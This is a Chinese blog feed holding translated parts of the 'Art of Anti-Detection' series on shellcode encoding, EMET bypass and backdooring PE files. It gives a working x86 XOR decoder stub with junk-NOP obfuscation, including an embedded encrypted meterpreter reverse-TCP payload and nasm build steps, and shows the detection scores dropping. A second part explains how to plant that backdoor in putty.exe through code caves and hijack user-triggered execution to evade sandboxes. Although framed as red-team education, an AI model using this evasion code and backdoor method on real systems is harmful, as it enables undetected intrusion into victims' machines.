<p>Ldr结构包含有关该进程已加载模块的信息，如果我们在Ldr结构内再移20个字节，我们将到达InMemoryOrderModuleList中的第一个模块，<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov edx, [edx+<span class="number">20</span>]</span><br></pre></td></tr></table></figure></p>
<div align="center"><br><img src="/img/anti_av3_Ldr.png" align><br></div>

<p>现在，我们的指针指向InMemoryOrderModuleList，这是一个LIST_ENTRY结构，Windows将该结构定义为包含该进程已加载模块的双向链接列表的头部。列表中的每个项目都是一个指向LDR_DATA_TABLE_ENTRY结构的指针，该结构是我们的主要目标，它包含已加载DLL（模块）的全名和基址，由于已加载模块的顺序可以更改，因此我们应检查全名为了找到包含我们要查找函数的正确的DLL，可以轻松地做到这一点，只要DLL名称与我们要查找的名称相匹配，则从LDR_DATA_TABLE_ENTRY的开头向后移40个字节，我们可以继续进行，通过在LDR_DATA_TABLE_ENTRY内部向前移动16个字节，我们现在终于有了加载的DLL的基址，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov edx, [edx+<span class="number">16</span>]</span><br></pre></td></tr></table></figure>
<div align="center"><br><img src="/img/anti_av3_LDR_DATA_TABLE_ENTRY.png" align><br></div><br>获取函数地址的第一步已经完成，现在我们有了包含所需函数的DLL的基址，我们必须解析DLL的导出表才能找到所需的函数地址，导出表位于在PE可选头中，从基地址向后移动60个字节，我们现在有了一个指向DLL在内存中的PE可选头的指针，<br><div align="center"><br><img src="/img/anti_av3_PE_On_Memory.gif" align><br></div>

<p>最后我们需要使用（模块基地址+ PE头地址+ 120字节）公式计算导出表的地址，这将给出导出表的地址（EAT），获得EAT地址后，我们现在可以访问对于DLL导出的所有功能，Microsoft下图描述了IMAGE_EXPORT_DIRECTORY，</p>
<div align="center"><br><img src="/img/anti_av3_Image_Export_Directory.gif" align><br></div><br>该结构包含导出函数的地址，名称和数量，使用同大小计算方式可以遍历函数地址，可以在此结构内获得所需的函数地址，当然，由于每个Windows版本，导出函数的顺序可能会有所不同在获取函数地址之前，应先检查函数名称，在确定函数名称之后，现在就可以找到函数地址，因此您可以理解，此方法仅涉及计算多个Windows数据结构的大小，并且遍历内存内部，这里真正的挑战是建立一个可靠的名称比较机制来选择正确的DLL和功能，似乎PEB解析技术很难实现，请不要担心，有更简单的方法可以做到这一点。<br><br>## 0x04 API哈希<br><br><a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="external">metasploit</a>项目中的几乎所有shellcode都使用一个称为<a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm" target="_blank" rel="external">Hash API</a>的汇编块，这是Stephen Fewer编写的一小段代码，自2009年以来，在metasploit中大多数Windows版本shellcode都使用了这个汇编文块，该汇编块使解析PEB结构变得更加容易，它使用基本的PEB解析逻辑和一些其他哈希方法来通过计算函数和模块名称的ROR13哈希来快速查找所需的函数。此块的用法非常简单，它使用stdcall调用约定，唯一的区别在于传送的函数参数，它需要函数名和包含该函数的DLL名称的ROR13哈希，传送必需的参数和函数哈希之后，它如前所述解析了PEB块，并在找到模块名后找到了模块名它计算ROR13哈希并将其保存到栈中，然后移至DLL的导出地址表，并计算每个函数名的ROR13哈希，它获取每个函数名称哈希值和模块名称哈希值的总和，如果总和与我们正在寻找的哈希值匹配，则意味着找到了所需的函数，最后，Hash API使用以下命令跳转到找到的函数地址在堆栈上传递的参数，这是一段非常优雅的代码，但由于它的流行和广泛使用，它已经到了最后的日子，某些反病毒产品和漏洞缓解措施专门针对此代码块的工作逻辑，甚至某些视反病毒产品对使用Hash API所使用的ROR13哈希作为识别恶意文件的签名，由于操作系统内部反漏洞解决方案的最新进展，Hash API的寿命很短，但是还有其他找到Windows的方法API函数地址，同时使用编码方法，此方法仍可以绕过大多数反病毒产品。<br><br>## 0x05 编码器/解码器设计<br><br>在开始涉及之前，读者需要知道的是单独使用编码器并不能生成完全不可检测的shellcode，在执行shellcode后解码器将直接解码整个shellcode为其原始形式，这不能绕过反病毒产品的动态分析机制。<br>解码器逻辑很简单，它将使用一个随机生成的多字节XOR密钥对shellcode进行解码，在执行解码操作后它将执行它，在将shellcode放入解码器头之前，应使用多字节XOR密钥对shellcode进行加密，并且应将shellcode和XOR密钥分别放置在<shellcode>、<key>标签内，<br><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;&#9;#===============================#&#10;;&#9;|ESI -&#62; Pointer to shellcode    |&#10;;&#9;|EDI -&#62; Pointer to key          |&#10;;&#9;|ECX -&#62; Shellcode index counter |&#10;;&#9;|EDX -&#62; Key index counter       |&#10;;&#9;|AL  -&#62; Shellcode byte holder   |&#10;;&#9;|BL  -&#62; Key byte holder         |&#10;;&#9;#===============================#&#10;;&#10;[BITS 32]&#10;[ORG 0]&#10;&#10; JMP GetShellcode         ; Jump to shellcode label&#10;Stub: &#10; POP ESI                  ; Pop out the address of shellcode to ESI register &#10; PUSH ESI                 ; Save the shellcode address to stack &#10; XOR ECX,ECX              ; Zero out the ECX register&#10;GetKey: &#10; CALL SetKey              ; Call the SetKey label&#10; Key: DB &#60;Key&#62;            ; Decipher key&#10; KeyEnd: EQU $-Key        ; Set the size of the decipher key to KeyEnd label&#10;SetKey:&#10; POP EDI                  ; Pop the address of decipher key to EDI register&#10; XOR EDX,EDX              ; Zero out the EDX register&#10;Decipher: &#10; MOV AL,[ESI]             ; Move 1 byte from shellcode to AL register&#10; MOV BL,[EDI]             ; Move 1 byte from decipher key to BL register&#10; XOR AL,BL                ; Make a logical XOR operation between AL ^ BL&#10; MOV [ESI],AL             ; Move back the deciphered shellcode byte to same index&#10; INC ESI                  ; Increase the shellcode index&#10; INC EDI                  ; Increase the key index&#10; INC ECX                  ; Increase the shellcode index counter&#10; INC EDX                  ; Increase the key index counter&#10; CMP ECX, End             ; Compare the shellcode index counter with shellcode size &#10; JE Fin                   ; If index counter is equal to shellcode size, jump to Fin label&#10; CMP EDX,KeyEnd           ; Compare the key index counter with key size &#10; JE GetKey                ; If key index counter is equal to key size, jump to GetKey label for reseting the key&#10; JMP Decipher             ; Repeate all operations&#10;Fin:                      ; In here deciphering operation is finished&#10; RET                      ; Execute the shellcode&#10;GetShellcode:&#10; CALL Stub                ; Jump to Stub label and push the address of shellcode to stack&#10; Shellcode: DB &#60;Shellcode&#62;&#10;&#10; End: EQU $-Shellcode     ; Set the shellcode size to End label</span><br></pre></td></tr></table></figure><br><br>由于代码几乎是自解释的，因此我不会浪费时间逐行解释它，使用JMP / CALL技巧可以在运行时获取shellcode和密钥的地址，然后使用shellcode的每个字节与密钥的每个字节做xor运算，每次解密密钥到达结尾时，它将重头开始使用密钥，完成解码操作后，它将跳转到shellcode，使用更长的XOR密钥会增加shellcode的随机性，还会增加代码块的熵，因此避免使用太长的解密密钥，有数百种方法使用基本逻辑运算（例如XOR，NOT，ADD，SUB，ROR，ROL）对shellcode进行编码，在每个编码器例程中都有无限可能的shellcode输出，可能反病毒产品在解码shellcode之前检测外壳代码的签名非常低，因为某些反病毒产品还开发了启发式引擎，能够检测代码块内的解密和解码循环。在编写shellcode编码器时，这里还有几种方法可以绕过针对shellcode编码器的静态检测，<br><br>### 不常见的寄存器用法<br><br>在x86体系结构中，所有寄存器都有特定的用途，例如ECX代表扩展计数器寄存器，它通常用作循环计数器，当我们以任何编译语言编写基本循环条件时，编译器可能会使用ECX寄存器作为循环计数器。循环计数器变量，启发式引擎在代码块中找到连续增加的ECX寄存器强烈表明存在循环，此问题的解决方案很简单，不将ECX寄存器用于循环计数器，这只是一个示例，但它也非常对于所有其他类型的代码片段（如函数结尾/序言等）有效。很多代码识别机制取决于寄存器使用情况，用非常用的寄存器使用方式编写汇编代码会降低检测率。<br><br>### 垃圾代码填充<br><br>可能有数百种方法来识别代码块内的解码器，并且几乎每个反病毒产品都使用不同的方法，但是最终它们必须生成一个签名。在解码器代码内随机使用NOP指令是一个很好的方法绕过基于签名的静态检测，也可以使用其他任何不影响程序原始功能的指令指令替代NOP指令，其目的是添加垃圾指令以分解代码块内的恶意签名，另一个编写shellcode的重要之处在于大小，因此请避免在解码器内部使用过多的垃圾混淆代码，否则会增加整体大小。<br>实施此方法后，结果代码如下所示：<br><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;&#9;#==============================#&#10;;&#9;|ESI -&#62; Pointer to shellcode   |&#10;;&#9;|EDI -&#62; Pointer to key         |&#10;;&#9;|EAX -&#62; Shellcode index counter|&#10;;&#9;|EDX -&#62; Key index counter      |&#10;;&#9;|CL  -&#62; Shellcode byte holder  |&#10;;&#9;|BL  -&#62; Key byte holder        |&#10;;&#9;#==============================#&#10;;&#10;&#10;[BITS 32]&#10;[ORG 0]&#10;&#10;    JMP GetShellcode                ; Jump to shellcode label&#10;Stub:       &#10;    POP ESI                         ; Pop out the address of shellcode to ESI register        &#10;    PUSH ESI                        ; Save the shellcode address to stack &#10;    XOR EAX,EAX                     ; Zero out the EAX register&#10;GetKey:     &#10;    CALL SetKey                     ; Call the SetKey label&#10;    Key: DB 0x78, 0x9b, 0xc5, 0xb9, 0x7f, 0x77, 0x39, 0x5c, 0x4f, 0xa6                 ; Decipher key&#10;    KeyEnd: EQU $-Key               ; Set the size of the decipher key to KeyEnd label&#10;SetKey:&#10;    POP EDI                         ; Pop the address of decipher key to EDI register&#10;    NOP                             ; [GARBAGE]&#10;    XOR EDX,EDX                     ; Zero out the EDX register&#10;    NOP                             ; [GARBAGE]&#10;Decipher:       &#10;    NOP                             ; [GARBAGE]&#10;    MOV CL,[ESI]                    ; Move 1 byte from shellcode to CL register&#10;    NOP                             ; [GARBAGE]&#10;    NOP                             ; [GARBAGE]&#10;    MOV BL,[EDI]                    ; Move 1 byte from decipher key to BL register&#10;    NOP                             ; [GARBAGE]&#10;    XOR CL,BL                       ; Make a logical XOR operation between CL ^ BL&#10;    NOP                             ; [GARBAGE]&#10;    NOP                             ; [GARBAGE]&#10;    MOV [ESI],CL                    ; Move back the deciphered shellcode byte to same index&#10;    NOP                             ; [GARBAGE]&#10;    NOP                             ; [GARBAGE]&#10;    INC ESI                         ; Increase the shellcode index&#10;    INC EDI                         ; Increase the key index&#10;    INC EAX                         ; Increase the shellcode index counter&#10;    INC EDX                         ; Increase the key index counter&#10;    CMP EAX, End                    ; Compare the shellcode index counter with shellcode size &#10;    JE Fin                          ; If index counter is equal to shellcode size, jump to Fin label&#10;    CMP EDX,KeyEnd                  ; Compare the key index counter with key size &#10;    JE GetKey                       ; If key index counter is equal to key size, jump to GetKey label for reseting the key&#10;    JMP Decipher                    ; Repeate all operations&#10;Fin: ; In here deciphering operation is finished&#10;    RET                             ; Execute the shellcode&#10;GetShellcode:&#10;    CALL Stub                       ; Jump to Stub label and push the address of shellcode to stack&#10;    Shellcode: DB  0x84, 0x73, 0x47, 0xb9, 0x7f, 0x77, 0x59, 0xd5, 0xaa, 0x97, 0xb8, 0xff,&#10;  0x4e, 0xe9, 0x4f, 0xfc, 0x6b, 0x50, 0xc4, 0xf4, 0x6c, 0x10, 0xb7, 0x91,&#10;  0x70, 0xc0, 0x73, 0x7a, 0x7e, 0x59, 0xd4, 0xa7, 0xa4, 0xc5, 0x7d, 0x5b,&#10;  0x19, 0x9d, 0x80, 0xab, 0x79, 0x5c, 0x27, 0x4b, 0x2d, 0x20, 0xb2, 0x0e,&#10;  0x5f, 0x2d, 0x32, 0xa7, 0x4e, 0xf5, 0x6e, 0x0f, 0xda, 0x14, 0x4e, 0x77,&#10;  0x29, 0x10, 0x9c, 0x99, 0x7e, 0xa4, 0xb2, 0x15, 0x57, 0x45, 0x42, 0xd2,&#10;  0x4e, 0x8d, 0xf4, 0x76, 0xef, 0x6d, 0xb0, 0x0a, 0xb9, 0x54, 0xc8, 0xb8,&#10;  0xb8, 0x4f, 0xd9, 0x29, 0xb9, 0xa5, 0x05, 0x63, 0xfe, 0xc4, 0x5b, 0x02,&#10;  0xdd, 0x04, 0xc4, 0xfe, 0x5c, 0x9a, 0x16, 0xdf, 0xf4, 0x7b, 0x72, 0xd7,&#10;  0x17, 0xba, 0x79, 0x48, 0x4e, 0xbd, 0xf4, 0x76, 0xe9, 0xd5, 0x0b, 0x82,&#10;  0x5c, 0xc0, 0x9e, 0xd8, 0x26, 0x2d, 0x68, 0xa3, 0xaf, 0xf9, 0x27, 0xc1,&#10;  0x4e, 0xab, 0x94, 0xfa, 0x64, 0x34, 0x7c, 0x94, 0x78, 0x9b, 0xad, 0xce,&#10;  0x0c, 0x45, 0x66, 0x08, 0x27, 0xea, 0x0f, 0xbd, 0xc2, 0x46, 0xaa, 0xcf,&#10;  0xa9, 0x5d, 0x4f, 0xa6, 0x51, 0x5f, 0x91, 0xe9, 0x17, 0x5e, 0xb9, 0x37,&#10;  0x4f, 0x59, 0xad, 0xf1, 0xc0, 0xd1, 0xbf, 0xdf, 0x3b, 0x47, 0x27, 0xa4,&#10;  0x78, 0x8a, 0x99, 0x30, 0x99, 0x27, 0x69, 0x0c, 0x1f, 0xe6, 0x28, 0xdb,&#10;  0x95, 0xd1, 0x95, 0x78, 0xe6, 0xbc, 0xb0, 0x73, 0xef, 0xf1, 0xd5, 0xef,&#10;  0x28, 0x1f, 0xa0, 0xf9, 0x3b, 0xc7, 0x87, 0x4e, 0x40, 0x79, 0x0b, 0x7b,&#10;  0xc6, 0x12, 0x47, 0xd3, 0x94, 0xf3, 0x35, 0x0c, 0xdd, 0x21, 0xc6, 0x89,&#10;  0x25, 0xa6, 0x12, 0x9f, 0x93, 0xee, 0x17, 0x75, 0xe0, 0x94, 0x10, 0x59,&#10;  0xad, 0x10, 0xf3, 0xd3, 0x3f, 0x1f, 0x39, 0x4c, 0x4f, 0xa6, 0x2e, 0xf1,&#10;  0xc5, 0xd1, 0x27, 0xd3, 0x6a, 0xb9, 0xb0, 0x73, 0xeb, 0xc8, 0xaf, 0xb9,&#10;  0x29, 0x24, 0x6e, 0x34, 0x4d, 0x7f, 0xb0, 0xc4, 0x3a, 0x6c, 0x7e, 0xb4,&#10;  0x10, 0x9a, 0x3a, 0x48, 0xbb&#10;&#10;&#10;    End: EQU $-Shellcode            ; Set the shellcode size to End label</span><br></pre></td></tr></table></figure><br><br>唯一的变化是EAX和ECX寄存器之间的变化，现在负责计算shellcode索引的寄存器是EAX，并且每条XOR和MOV指令之间只有几行NOP填充，本教程使用的shellcode是Windowsmeterpreter反向TCP，经过加密带有10字节长的随机XOR密钥的shellcode都放置在解码器中，使用nasm -f bin Decoder.asm命令将解码器组装为二进制格式（不要忘记删除shellcode上的换行符否则nasm会编译失败）。<br>这是对原始Shellcode进行编码之前的反病毒扫描结果，<br><br><div align="center"><br><img src="/img/anti_av3_Shellcode.png" align><br></div>

<p>如您所见，许多反病毒软件都可以识别Shellcode。这是经过编码的shellcode的结果，</p>
<div align="center"><br><img src="/img/anti_av3_EncodedShellcode.png" align><br></div>

<h2 id="0x06_对抗漏洞缓解方案">0x06 对抗漏洞缓解方案</h2><p>当绕过反病毒软件时，有很多成功的方法，但是漏洞​​利用缓解将情况提升到一个全新的水平，微软在2009年发布了<a href="https://support.microsoft.com/en-us/help/2458544/the-enhanced-mitigation-experience-toolkit" target="_blank" rel="external">增强缓解体验工具包（EMET）</a>，它是一种有助于防止漏洞利用的实用程序。在成功开发软件方面，它具有多种保护机制，</p>
<ul>
<li>动态数据执行保护（DEP）</li>
<li>结构异常处理程序覆盖保护（SEHOP）</li>
<li>空页分配</li>
<li>堆喷防护</li>
<li>导出地址表地址过滤（EAF）</li>
<li>强制性ASLR</li>
<li>导出地址表访问过滤增强版（EAF +）</li>
<li>缓解ROP<ul>
<li>加载库检查</li>
<li>内存保护检查</li>
<li>调用方检查</li>
<li>模拟执行流程</li>
<li>Stack pivot</li>
</ul>
</li>
<li>减少攻击面（ASR）</li>
</ul>
<p>在这些缓解措施中，EAF，EAF +和调用方检查是我们最关注的问题，如前所述，metasploit框架中的几乎所有shellcode都使用Stephen Fewer的Hash API，并且由于Hash API应用了PEB/EAT解析技术，因此EMET可以轻松检测并阻止执行shellcode。</p>
<h2 id="0x07_绕过EMET">0x07 绕过EMET</h2><p>调用方检查EMET内部以检查由进程进行的Windows API调用，它阻止Win API函数中的RET和JMP指令，以防止在找到所需的Win API之后在Hash API中使用所有使用面向返回的编程（ROP）方法的漏洞利用函数地址使用JMP指令执行函数，不幸的是这将触发EMET调用者检查，为了绕过调用者检查，应避免使用指向Win API函数的JMP和RET指令，而应替换用于执行的JMP指令带有CALL的Win API函数，Hash API应该通过调用方检查，但是当我们查看EAF、EAF+缓解技术时，它们会阻止访问导出地址表（EAT）进行读/写访问，具体取决于所调用的代码，并检查栈寄存器是否在允许的范围内，并尝试检测对某些DLL如KERNELBASE的MZ/PE头的访问，这是一种用于防止EAT解析技术的非常有效的缓解方法，但是EAT并不是唯一包含所需函数地址的结构，如果应用程序使用了，则导入地址表（IAT）还将保存应用程序使用的Win API函数地址还在使用所需的功能时，可以在IAT结构中收集功能地址，一位名叫Joshua Pitts的网络安全研究人员最近开发了一种新的IAT解析方法，它在导入地址表中找到了LoadLibraryA和GetProcAddress Windows API函数，在获取这些函数地址后，可以从任何库中提取任何函数，他还编写了一个名为fido的工具，用于剥离Stephen Fewer的Hash API并替换为他编写的IAT解析代码，如果您想在阅读有关此方法的更多信息请点击<a href="https://github.com/secretsquirrel/fido/blob/master/REconBR_2017.pdf" target="_blank" rel="external">这</a>.</p>
<h2 id="参考">参考</h2><ul>
<li><a href="https://msdn.microsoft.com/en-us/library/ms809762.aspx" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/ms809762.aspx</a></li>
<li><a href="https://en.wikipedia.org/wiki/Process_Environment_Block" target="_blank" rel="external">https://en.wikipedia.org/wiki/Process_Environment_Block</a></li>
<li><a href="https://support.microsoft.com/en-us/help/875352/a-detailed-description-of-the-data-execution-prevention-dep-feature-in-windows-xp-service-pack-2,-windows-xp-tablet-pc-edition-2005,-and-windows-server-2003" target="_blank" rel="external">https://support.microsoft.com/en-us/help/875352/a-detailed-description-of-the-data-execution-prevention-dep-feature-in-windows-xp-service-pack-2,-windows-xp-tablet-pc-edition-2005,-and-windows-server-2003</a></li>
<li><a href="https://en.wikipedia.org/wiki/Portable_Executable" target="_blank" rel="external">https://en.wikipedia.org/wiki/Portable_Executable</a></li>
<li><a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" target="_blank" rel="external">https://en.wikipedia.org/wiki/Address_space_layout_randomization</a></li>
<li><a href="https://en.wikipedia.org/wiki/X86_calling_conventions" target="_blank" rel="external">https://en.wikipedia.org/wiki/X86_calling_conventions</a></li>
<li><a href="http://www.vividmachines.com/shellcode/shellcode.html" target="_blank" rel="external">http://www.vividmachines.com/shellcode/shellcode.html</a></li>
<li><a href="https://github.com/secretsquirrel/fido" target="_blank" rel="external">https://github.com/secretsquirrel/fido</a></li>
<li><a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm" target="_blank" rel="external">https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm</a></li>
<li><a href="https://www.amazon.com/Shellcoders-Handbook-Discovering-Exploiting-Security/dp/047008023X" target="_blank" rel="external">The Shellcoder’s Handbook: Discovering and Exploiting Security Holes</a></li>
<li><a href="https://www.amazon.com/Sockets-Shellcode-Porting-Coding-Professionals/dp/1597490059" target="_blank" rel="external">Sockets, Shellcode, Porting, and Coding: Reverse Engineering Exploits and Tool Coding for Security Professionals</a></li>
</ul>
<p><em>原文链接：<a href="https://pentest.blog/art-of-anti-detection-3-shellcode-alchemy/" target="_blank" rel="external">https://pentest.blog/art-of-anti-detection-3-shellcode-alchemy/</a></em></p>
</key></shellcode>]]></content>
    <summary type="html">
    <![CDATA[<p> 本文将讨论编写shellcode的基础知识和相关改变，包含汇编级别的编码器/解码器设计以及几种绕过漏洞缓解方案的方法，如微软的增强缓解应急工具包（Microsoft’s Enhanced Mitigation Experience Toolkit，EMET）。为了理解本文的内容，读者需要至少具有一定的x86汇编方面的基础，并对COFF和PE等基本文件格式有相当的了解，也可以读之前的文章<a href="http://www.youngroe.com/2020/09/03/Cybersecurity/art-of-anti-detection-1-introduction-to-av-detection-techniques/">反检测的艺术1-反病毒软件及检测技术概述</a>、<a href="http://www.youngroe.com/2020/09/04/Cybersecurity/art-of-anti-detection-2-pe-backdoor-manufacturing/">反检测的艺术2-如何制作PE文件后门</a>理解反病毒软件使用的基本检测技术的内部工作原理和相关术语。<br>]]>
    
    </summary>
    
      <category term="反病毒" scheme="http://www.youngroe.com/tags/%E5%8F%8D%E7%97%85%E6%AF%92/"/>
    
      <category term="Cybersecurity" scheme="http://www.youngroe.com/categories/Cybersecurity/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[反检测的艺术2-如何制作PE文件后门（翻译）]]></title>
    <link href="http://www.youngroe.com/2020/09/04/Cybersecurity/art-of-anti-detection-2-pe-backdoor-manufacturing/"/>
    <id>http://www.youngroe.com/2020/09/04/Cybersecurity/art-of-anti-detection-2-pe-backdoor-manufacturing/</id>
    <published>2020-09-04T11:39:22.000Z</published>
    <updated>2021-03-16T15:19:39.846Z</updated>
    <content type="html"><![CDATA[<p>本文将会介绍用于安全测试红队目的几种制作PE（Portable Executable）文件后门的方法，如果需要完全理解本文，读者至少需要对x86汇编有一定的了解，同时需要熟悉调试器并且对PE文件格式有较高的理解。<br><a id="more"></a></p>
<h2 id="0x00_介绍">0x00 介绍</h2><p>现在，几乎所有安全研究人员，测试人员和恶意软件分析师在日常工作中都会处理后门，维持后门访问权限最流行的方式是将后门安装到系统或某个软件中。本文的大部分内容是如何在32位PE文件中植入后门的方法，但是由于PE文件格式是Unix COFF（通用对象文件格式）的修改版本，因此这些方法也可以移植用于所有其他可执行二进制文件文件类型。植入后门的隐蔽性对在系统中停留更长的时间非常重要，因此本文介绍的方法都会尽量减少被反病毒软件检出的概率。在继续阅读本文之前，请先阅读第一篇文章<a href="http://www.youngroe.com/art-of-anti-detection-1-introduction-to-av-detection-techniques">反检测的艺术1-反病毒软件及检测技术概述</a>，这对于理解反病毒产品的内部工作原理和有关反检测的基本思路将非常有帮助。</p>
<h2 id="0x01_相关术语">0x01 相关术语</h2><h3 id="红队渗透测试">红队渗透测试</h3><p>在网络安全领域，红队是一群白帽黑客，他们像攻击者一样攻击组织的网络基础架构，目的是测试（通常称为渗透测试）组织的防御能力。包括Microsoft在内的公司会定期组织红蓝两队进行渗透测试。组织红蓝两队的渗透测试体现了以攻促防的安全理念，可以快速发现网络安全问题并及早解决。</p>
<h3 id="地址空间布局随机化">地址空间布局随机化</h3><p>（ASLR）是一种计算机安全技术，主要用于防止缓冲区溢出攻击。防止攻击者精确的跳转到内存中的某个特定漏洞地址空间地址实现漏洞利用，ASLR随机布局进程内存的关键数据区域的地址空间位置，包括可执行文件的基地址以及栈，堆和相关库的地址。</p>
<h3 id="Code_Caves">Code Caves</h3><p>Code Caves是一个程序写入另一个进程的内存的一段代码。这段代码可以通过在目标进程内创建远程线程来执行。代码的Code Caves通常是对代码的脚本函数的一部分的引用，该脚本函数具有注入自定义指令的能力。例如，如果脚本的内存允许5个字节，并且只使用3个字节，则剩余的2个字节可以用于向脚本添加外部代码, 这就是所谓的code cave。</p>
<h3 id="校验和">校验和</h3><p>校验和是对一段数据进行计算得到的一段小尺寸的数据，目的是检测可能在传输或存储过程中引入的错误。通常应用于安装文件从下载服务器收到安装文件的场景。就其本身而言，校验和通常用于验证数据完整性，但并不依赖于校验和来验证数据的真实性。</p>
<h2 id="0x02_主要方法">0x02 主要方法</h2><p>本文所有实现和示例都将使用putty SSH客户端实现。选择putty作为后门实践的宿主原因有很多，其中之一是putty是一个使用多个库和Windows API原生的C++客户端，另一个原因是使用SSH客户端作为后门将很难被注意到，因为putty客户端本身需要使用tcp连接。可以避免被蓝队网络监控发现，使用的后门代码是metasploit项目中Stephen Fever的反向TCP meterpreter shellcode。主要目标是将meterpreter shellcode注入目标PE文件，同时不破坏程序的实际功能。注入的shellcode将在新线程上执行，并将尝试持续连接到服务端。在执行所有这些操作时，另一个目标是使检测分数保持尽可能低的水平。<br>在PE文件中植入后门的常用方法包括4个主要步骤。</p>
<ul>
<li>1）为后门代码寻找可用空间</li>
<li>2）劫持程序执行流程</li>
<li>3）注入后门代码</li>
<li>4）恢复执行流程<br>在每个步骤中，都有很多细节的关键东西，这些细节保证了后门的隐蔽性防止被检测。</li>
</ul>
<h3 id="可用空间问题">可用空间问题</h3><p>第一步需要找到一块可用的空间，在PE文件中找到合适空间插入后门代码非常重要，被插入后门后的PE文件威胁检测分数很大程序上取决于如何在可用空间插入后门代码，一般有两种方式解决空间空间问题：</p>
<h4 id="1）添加一个新的section">1）添加一个新的section</h4><p>与另一种方法相比，此方法在检测分数上有更多缺点，但是通过添加一个新的section，对将要植入的后门代码没有大小限制。<br>通过使用反汇编工具或如LordPE的PE编辑器，可以通过添加新的section header来增加所有PE文件大小，下面是putty可执行文件的节表，通过PE编辑器，增加一个名称为NewSec大小为1000字节新section。</p>
<div align="center"><br><img src="/img/anti_av2_putty_sections.png" align><br></div>

<p>创建新section时，必须将section flags设置为”Read/Write/Execute”，否则PE文件被映射到内存后shellcode不能正常运行。</p>
<div align="center"><br><img src="/img/anti_av2_sectionflags.png" align><br></div>

<p>添加节头后，需要调整文件大小，可以使用十六进制编辑器在文件末尾添加section大小的空字节实现。</p>
<div align="center"><br><img src="/img/anti_av2_sectionflags.png" align><br></div>

<p>完成上述操作后，建议运行添加新section后的可执行问价你，以防出现任何错误，如果可执行文件运行顺利，则可以在调试器上修改新section。</p>
<div align="center"><br><img src="/img/anti_av2_newsec.png" align><br></div>

<p>通过添加新section来解决空间问题，在反检测分数上几乎没有任何优势，几乎所有的反病毒软件都可以识别不常见的section，而对不常见的section赋予所有（Read/Write/Execute）权限肯定是非常可疑的。<br>即使在putty可执行文件中添加一个空的完整权限section，某些反病毒软件也会将其标记为恶意。</p>
<div align="center"><br><img src="/img/anti_av2_VirusTotal.png" align><br></div>

<h4 id="2）Code_Caves">2）Code Caves</h4><p>解决空间问题的第二种方法是使用目标可执行文件的Code Caves。几乎所有编译的二进制文件都有可以用于插入后门代码的Code Caves。由于使用原始PE可执行文件空间，使用Code Caves代替增加section有助于减小被反病毒产品判定为恶意代码的风险。而且PE文件的大小在后门程序结束时不会更改，但是这种方法也有一些缺点。<br>Code Caves的数量和大小因文件而异，但是与添加新节相比，通常没有太多空间。使用Code Caves时，应尽量减少后门代码的尺寸。另一个缺点是section flag，由于应用程序的执行流程将劫持到到Code Caves，因此包含Code Caves的部分应具有Execute权限，为了修改section中的代码需要write权限，即使使某些shellcode是以自修改方式编码或混淆的。<br>多个Code Caves的使用将有助于解决空间限制问题，同时将后门代码拆分为多个片段有助于减少检测分数，但不幸的是，更改段权限看起来依然很可疑。有高级方法可以在运行时修改内存区域权限，以避免直接更改section flag，但是由于这些方法需要定制的shellcode，编码和IAT解析技术，因此将在下一篇文章中讨论。<br>借助名为Cminer的工具，可以很容易地枚举二进制文件的所有Code Caves。使用./Cminer putty.exe 300命令，可以枚举大于300字节的Code Caves。</p>
<div align="center"><br><img src="/img/anti_av2_cminer1.png" align><br></div>

<p>在本例中有5个比较好的Code Caves。start address给出了Code Caves的虚拟内存地址（VMA）。这是PE文件加载到内存中时Code Caves的地址，file offest是以字节为单位的PE文件形式Code Caves的位置起始地址。</p>
<div align="center"><br><img src="/img/anti_av2_cminer2.png" align><br></div>

<p>似乎大多数Code Caves都在data section，但data部分没有execute section flag，因此需要进行更改。后门代码大约为400-500字节，因此第5个Code Caves应该绰绰有余。应将所选Code Caves的起始地址保存下来，将section flag更改为R/W/E，后门程序的第一步将完成了，现在该劫持代码执行流程了。</p>
<h3 id="劫持执行流程">劫持执行流程</h3><p>在本小结中，目标是通过修改目标可执行文件中的指令将执行流重定向到后门代码。关于如何选择要修改的指令，有一个重要的细节。所有二进制指令的大小均以字节为单位，为了跳转到后门代码地址，将使用5或6个字节的长跳转。因此，在patch二进制文件时，要修改的指令必须与长跳转指令具有相同的大小，否则被修改位置上一条或下一条指令将被破坏。<br>选择正确的位置来重定向执行对于绕过反病毒软件的动态和沙箱分析非常重要。如果直接重定向，则可能会被反病毒软件的动态分析阶段检测到重定向。</p>
<p><strong>通过用户交互隐藏</strong>：<br>绕过沙箱/动态分析首先想到的是延迟Shellcode的执行或设计可识别沙箱的Shellcode和触发机制。但在插入后门代码时，大多数时候没有太多空间可以在PE文件中添加这些额外的代码。此外，通过汇编级语言编写反检测机制也需要大量时间和专业的知识。<br>利用需要用户交互才能执行后门代码，只有在实际用户操作程序时，通过用户交互才重定向执行后门代码。如果可以正确实现此方法，则成功率将为%100，并且不会增加后门代码的大小。<br>Putty可执行UI上的“Open”按钮启动一个功能，该功能实际检查给定IP地址的有效性。</p>
<div align="center"><br><img src="/img/anti_av2_putty.png" align><br></div>

<p>如果IP地址字段值不为空且有效，它将启动连接功能尝试连接给定的IP地址。<br>如果客户端成功创建SSH会话，则会弹出一个新窗口并要求提供凭据。</p>
